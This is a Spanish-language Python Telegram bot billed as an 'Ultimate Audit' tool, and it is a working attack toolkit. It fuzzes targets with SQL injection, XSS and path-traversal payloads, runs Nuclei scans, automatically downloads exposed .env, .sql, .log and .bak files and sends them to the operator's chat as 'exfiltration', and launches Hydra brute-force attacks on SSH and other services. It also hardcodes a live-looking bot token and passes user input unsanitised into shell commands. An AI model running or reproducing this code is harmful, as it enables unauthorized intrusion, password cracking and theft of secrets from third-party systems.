import telebot
from telebot import types
import subprocess
import os
import time
import re

# --- CONFIGURACIÓN ---
TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
YOUR_CHAT_ID = "6280594821"

bot = telebot.TeleBot(TOKEN)

# --- DETECTOR DE RUTA PARA HYDRA ---
def obtener_comando_hydra():
    check = subprocess.run("command -v hydra", shell=True, capture_output=True)
    if check.returncode == 0:
        return "hydra"
    ruta_script = os.path.abspath(os.path.join(os.getcwd(), "..", "hydra", "hydra.sh"))
    if os.path.exists(ruta_script):
        subprocess.run(f"chmod +x {ruta_script}", shell=True)
        return f"bash {ruta_script}"
    return None

# --- MOTOR DE INTELIGENCIA Y ANÁLISIS DE RESPUESTAS ---
def motor_inteligencia(archivo_reporte):
    # Detección de errores, comparación de comportamiento y pattern matching
    analisis = "🧠 **ANÁLISIS DE INTELIGENCIA V9.5**\n"
    prioridad = "🟢 BAJA"
    
    with open(archivo_reporte, "r") as f:
        content = f.read().lower()

    # Pattern Matching: SQLi, XSS, LFI, Credenciales
    vulnerabilidades = []
    if any(x in content for x in ["sql syntax", "mysql_fetch", "waitfor delay", "sql injection"]):
        vulnerabilidades.append("💉 **Inyección SQL detectada** (Análisis de Error/Tiempo)")
        prioridad = "🔴 CRÍTICA"
    if any(x in content for x in ["<script>", "alert(", "xss-reflection"]):
        vulnerabilidades.append("🧪 **XSS (Cross Site Scripting)**")
        prioridad = "🟠 ALTA"
    if any(x in content for x in ["root:x:0:0", "boot.ini", "/etc/passwd"]):
        vulnerabilidades.append("📂 **LFI/RFI detectado** (Acceso a archivos)")
        prioridad = "🔴 CRÍTICA"
    if any(x in content for x in [".env", "aws_access_key", "db_password"]):
        vulnerabilidades.append("🔐 **Fuga de Credenciales Críticas**")
        prioridad = "🔴 CRÍTICA"

    if vulnerabilidades:
        analisis += f"Nivel: {prioridad}\n\n" + "\n".join(vulnerabilidades)
    else:
        analisis += "No se detectaron patrones de vulnerabilidad conocidos."
    
    return analisis

# --- AUTO-EXFILTRACIÓN ---
def exfiltrar_datos(url, chat_id):
    try:
        clean_url = url.strip()
        file_name = f"exfil_{int(time.time())}.txt"
        # Request manipulation: Modificamos el User-Agent para evadir bloqueos simples
        subprocess.run(f"curl -s -k -L -A 'Mozilla/5.0' {clean_url} -o {file_name}", shell=True)
        
        if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
            with open(file_name, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📥 **Datos extraídos de:**\n`{clean_url}`", parse_mode="Markdown")
            os.remove(file_name)
    except Exception as e:
        print(f"Error exfiltrando: {e}")

# --- MENÚ PRINCIPAL ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        help_text = (
            "🤖 **Bugtin Bot v9.5 - Ultimate Audit**\n\n"
            "📡 `/subs` - Recon de Subdominios.\n"
            "🕸️ `/crawl` - Mapeo de endpoints/formularios.\n"
            "🔍 `/fuzz` - Fuzzing & Request Manipulation.\n"
            "🔓 `/auditar` - Escaneo completo con IA.\n"
            "⚡ `/fuerza` - Hydra (Fuerza bruta).\n\n"
            "🚀 *Selecciona una opción del menú:* "
        )
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📡 Reconocimiento", "🕸️ Crawling Activo")
        markup.add("🔍 Fuzzing Avanzado", "🔓 Auditoría IA")
        markup.add("⚡ Ataque Hydra")
        bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode="Markdown")

# --- COMANDO: SUBDOMINIOS ---
@bot.message_handler(commands=['subs'])
def start_subs(message):
    ejemplo = (
        "📡 **Comando: /subs (Reconocimiento)**\n\n"
        "Mapea todos los subdominios de un objetivo para ampliar la superficie de ataque.\n"
        "💡 **Ejemplo:** `google.com` o `tesla.com`"
    )
    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_subdomains_step)

def process_subdomains_step(message):
    target = message.text.strip().lower()
    chat_id = message.chat.id
    output = "subs_result.txt"
    bot.send_message(chat_id, f"🚀 Escaneando subdominios de `{target}`...")
    try:
        subprocess.run(f"subfinder -d {target} -silent -o {output}", shell=True)
        if os.path.exists(output) and os.path.getsize(output) > 0:
            with open(output, "rb") as f:
                bot.send_document(chat_id, f, caption=f"🏁 Subdominios encontrados: {target}")
            os.remove(output)
        else:
            bot.send_message(chat_id, "❌ No se encontraron subdominios públicos.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- COMANDO: CRAWLING (MAREO DE ENDPOINTS) ---
@bot.message_handler(commands=['crawl'])
def start_crawl(message):
    ejemplo = (
        "🕸️ **Comando: /crawl (Mapeo de Endpoints)**\n\n"
        "Descubre automáticamente rutas, formularios, archivos JS y parámetros ocultos.\n"
        "💡 **Ejemplo:** `https://example.com`"
    )
    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_crawl_step)

def process_crawl_step(message):
    url = message.text.strip().lower()
    chat_id = message.chat.id
    output = "crawl_map.txt"
    bot.send_message(chat_id, f"🕷️ Mapeando estructura de `{url}`...\nAnalizando formularios y scripts.", parse_mode="Markdown")
    try:
        # Crawling recursivo con profundidad 3
        subprocess.run(f"katana -u {url} -d 3 -jc -o {output} -silent", shell=True)
        if os.path.exists(output) and os.path.getsize(output) > 0:
            with open(output, "rb") as f:
                bot.send_document(chat_id, f, caption=f"🗺️ Mapa de Endpoints: {url}")
            os.remove(output)
        else:
            bot.send_message(chat_id, "❌ No se pudo extraer la estructura de la web.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- COMANDO: FUZZING (REQUEST MANIPULATION) ---
@bot.message_handler(commands=['fuzz'])
def start_fuzz(message):
    ejemplo = (
        "🔍 **Comando: /fuzz (Manipulación de Peticiones)**\n\n"
        "Envía miles de payloads a un parámetro específico para detectar inyecciones.\n"
        "💡 **Ejemplo:** `https://target.com/index.php?id=FUZZ` \n"
        "*(El bot reemplazará FUZZ con inyecciones SQL/XSS)*"
    )
    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_fuzz_step)

def process_fuzz_step(message):
    url = message.text.strip()
    chat_id = message.chat.id
    payloads = "adv_payloads.txt"
    output = "fuzz_results.md"
    
    if "FUZZ" not in url:
        bot.send_message(chat_id, "❌ Error: Debes incluir la palabra `FUZZ` en la URL para saber dónde inyectar.")
        return

    if not os.path.exists(payloads):
        with open(payloads, "w") as f:
            f.write("' OR 1=1--\n<script>alert(1)</script>\nadmin'--\n../../etc/passwd\nsleep(5)")

    bot.send_message(chat_id, "🧪 Iniciando Fuzzing masivo...\nAnalizando tiempos de respuesta (Timing Analysis).")
    try:
        # FFuf para detección de anomalías y manipulación de peticiones
        subprocess.run(f"ffuf -u {url} -w {payloads} -t 30 -o {output} -of md", shell=True)
        if os.path.exists(output):
            with open(output, "rb") as f:
                bot.send_document(chat_id, f, caption="🎯 Resultados del Fuzzing de Payloads")
            os.remove(output)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- COMANDO: AUDITORÍA IA ---
@bot.message_handler(commands=['auditar'])
def start_audit(message):
    ejemplo = (
        "🔓 **Comando: /auditar (Escaneo con Inteligencia)**\n\n"
        "Escaneo profundo de vulnerabilidades (CVEs, Exposiciones, Config) con análisis de impacto automático.\n"
        "💡 **Ejemplo:** `https://objetivo.com` o `192.168.1.1`"
    )
    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_audit_step)

def process_audit_step(message):
    target = message.text.strip().lower()
    chat_id = message.chat.id
    report = f"audit_{int(time.time())}.txt"
    bot.send_message(chat_id, f"🛰️ Iniciando Auditoría IA en `{target}`...\nEscaneando vulnerabilidades conocidas.", parse_mode="Markdown")
    try:
        # Scanning Masivo con Nuclei
        subprocess.run(f"nuclei -u {target} -silent -o {report}", shell=True)
        
        if os.path.exists(report) and os.path.getsize(report) > 0:
            # Inteligencia: Análisis de respuestas y patrones
            res_ia = motor_inteligencia(report)
            bot.send_message(chat_id, res_ia, parse_mode="Markdown")
            
            # Exfiltración basada en contexto
            with open(report, "r") as f:
                for line in f:
                    if "http" in line and any(x in line for x in [".env", ".sql", ".log", ".bak"]):
                        match = re.search(r'https?://[^\s\[\]\(\)]+', line)
                        if match: exfiltrar_datos(match.group(0), chat_id)
            
            with open(report, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📄 Reporte de Auditoría Final: {target}")
            os.remove(report)
        else:
            bot.send_message(chat_id, "✅ No se detectaron vulnerabilidades críticas automáticas.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- COMANDO: HYDRA (FUERZA BRUTA) ---
@bot.message_handler(commands=['fuerza'])
def start_fuerza(message):
    ejemplo = (
        "⚡ **Comando: /fuerza (Hydra)**\n\n"
        "Ataque de fuerza bruta a servicios de red.\n"
        "💡 **Formato:** `IP Servicio Usuario` \n"
        "💡 **Ejemplo:** `192.168.1.5 ssh root`"
    )
    msg = bot.send_message(message.chat.id, ejemplo, parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_fuerza_step)

def process_fuerza_step(message):
    try:
        cmd = obtener_comando_hydra()
        data = message.text.split()
        if not cmd or len(data) < 3:
            bot.send_message(message.chat.id, "❌ Error: Faltan parámetros o Hydra no está instalado.")
            return
        
        ip, svc, user = data[0], data[1], data[2]
        bot.send_message(message.chat.id, f"⚔️ Lanzando ataque contra `{ip}` ({svc})...")
        
        # Rate limiting awareness: t 4 (hilos moderados para evitar bloqueos)
        subprocess.run(f"{cmd} -l {user} -P passwords.txt -t 4 -f {ip} {svc} -o res_hydra.txt", shell=True)
        
        if os.path.exists("res_hydra.txt"):
            with open("res_hydra.txt", "r") as f:
                bot.send_message(message.chat.id, f"🎯 **¡ACCESO OBTENIDO!**\n\n`{f.read()}`", parse_mode="Markdown")
            os.remove("res_hydra.txt")
        else:
            bot.send_message(message.chat.id, "❌ Falló el ataque. Contraseña no encontrada.")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")

# --- MANEJADORES DE BOTONES ---
@bot.message_handler(func=lambda m: m.text == "📡 Reconocimiento")
def btn_recon(m): start_subs(m)
@bot.message_handler(func=lambda m: m.text == "🕸️ Crawling Activo")
def btn_crawl(m): start_crawl(m)
@bot.message_handler(func=lambda m: m.text == "🔍 Fuzzing Avanzado")
def btn_fuzz(m): start_fuzz(m)
@bot.message_handler(func=lambda m: m.text == "🔓 Auditoría IA")
def btn_aud(m): start_audit(m)
@bot.message_handler(func=lambda m: m.text == "⚡ Ataque Hydra")
def btn_hyd(m): start_fuerza(m)

print("🚀 Bugtin Bot v9.5 Ultimate cargado. Inteligencia de Scanning Activa.")
bot.polling()
